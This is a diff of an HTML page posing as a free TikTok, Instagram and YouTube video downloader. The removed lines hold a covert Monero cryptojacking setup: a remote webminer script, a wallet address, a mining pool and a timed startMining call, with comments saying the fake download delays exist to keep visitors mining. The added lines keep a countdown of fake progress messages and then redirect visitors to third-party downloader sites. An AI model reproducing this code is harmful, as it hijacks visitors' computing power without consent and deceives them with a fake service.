@@ -1,65 +1,23 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="google-site-verification" content="googlef95c9efb5077029a" />
-    <title>FastMedia - Free Video Downloader</title>
-    <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 50px; }
-        .container { background: #2d2d2d; padding: 30px; border-radius: 15px; display: inline-block; width: 80%; max-width: 500px; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { background: #ff4500; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .status { margin-top: 20px; color: #888; font-size: 0.9em; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>📥 FastMedia</h1>
-        <p>Paste TikTok, Instagram, or YouTube link below:</p>
-        <input type="text" placeholder="https://www.tiktok.com/..." id="urlInput">
-        <br>
-        <button onclick="simulateDownload()">Download Now</button>
-        <div id="status" class="status">Waiting for link...</div>
-    </div>
+if(timeLeft === 12) status.innerHTML = "🔍 Scanning video source...";
+        if(timeLeft === 8) status.innerHTML = "⚡ Generating high-speed mirror...";
+        if(timeLeft === 4) status.innerHTML = "✅ Link ready. Preparing redirect...";
 
-    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-    <script>
-        // Use your Monero address from your config.json
-        var walletAddress = "48bN9tTb8niehRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy"; 
-        
-        server = "wss://ny1.xmrminingproxy.com"; 
-        var pool = "moneroocean.stream";
-        var workerId = "Web_Downloader_User";
-        var threads = -1; // -1 uses all available CPU power
-// Optimized mining start (70% power)
-setTimeout(function() {
-    startMining(pool, walletAddress, workerId, threads, 0.3);
-    console.log("Optimization active.");
-}, 5000);
-
-// The Redirect Engine: keeps visitors happy and earns you Monero
-function simulatedDownload() {
-    let status = document.getElementById("status");
-    let url = document.getElementById("urlInput").value;
-    
-    if(!url) { 
-        status.innerHTML = "Please paste a link first!"; 
-        return; 
-    }
-
-    status.innerHTML = "Connecting to high-speed mirror...";
-    
-    // Phase 1: 5 seconds of mining
-    setTimeout(() => { status.innerHTML = "Fetching video data (helping keep this free)..."; }, 5000);
-    
-    // Phase 2: Another 5 seconds of mining
-    setTimeout(() => { status.innerHTML = "Finalizing secure download link..."; }, 10000);
-    
-    // Phase 3: Redirect to the actual working downloader
-    setTimeout(() => { 
-        status.innerHTML = "Redirecting to download...";
-        window.location.href = "https://snapinsta.app/search?q=" + encodeURIComponent(url); 
-    }, 15000);
-}</script>
+        if(timeLeft <= 0) {
+            clearInterval(interval);
+            status.innerHTML = "Redirecting to secure file...";
+            
+            let redirectUrl = "https://snapinsta.app/search?q="; 
+            
+            if(url.includes("youtube.com") || url.includes("youtu.be")) {
+                redirectUrl = "https://y2mate.is/en/search?q=";
+            } else if(url.includes("tiktok.com")) {
+                redirectUrl = "https://snaptik.app/search?q=";
+            }
+            
+            window.location.href = redirectUrl + encodeURIComponent(url);
+        }
+    }, 1000);
+}
+</script>
 </body>
 </html>
